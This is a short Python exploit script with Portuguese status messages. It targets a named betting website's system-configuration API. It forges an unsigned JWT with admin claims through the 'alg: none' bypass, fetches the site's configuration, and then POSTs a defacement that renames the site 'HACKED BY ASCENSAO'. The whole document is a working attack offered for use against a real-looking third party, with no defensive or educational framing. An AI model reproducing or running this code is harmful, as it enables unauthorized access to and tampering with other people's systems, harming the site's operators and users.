import requests
import json
import base64

def exploit_system_config():
    url = "https://w1-panda.bet/api/v1/system/config"
    print("[*] Tentando acessar configuração do sistema via bypass de JWT...")
    
    # Criar um token JWT falso com admin=true
    header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().replace("=", "")
    payload = base64.b64encode(json.dumps({"user": "admin", "role": "admin", "admin": True}).encode()).decode().replace("=", "")
    fake_token = f"{header}.{payload}."
    
    headers = {"Authorization": f"Bearer {fake_token}"}
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            print("[!!!] SUCESSO: Acesso à configuração do sistema obtido!")
            print(f"Configuração Atual: {response.text}")
            
            # Tentar realizar uma alteração demonstrativa (ex: mudar o nome do site)
            print("[*] Tentando realizar alteração demonstrativa no backend...")
            update_payload = {"site_name": "W1-Panda.bet - HACKED BY ASCENSAO"}
            update_res = requests.post(url, headers=headers, json=update_payload, timeout=10)
            if update_res.status_code == 200:
                print("[!!!] SUCESSO: Alteração no backend realizada com sucesso!")
                return True
    except:
        pass
        
    print("[-] Não foi possível acessar ou alterar a configuração do sistema.")
    return False

if __name__ == "__main__":
    exploit_system_config()
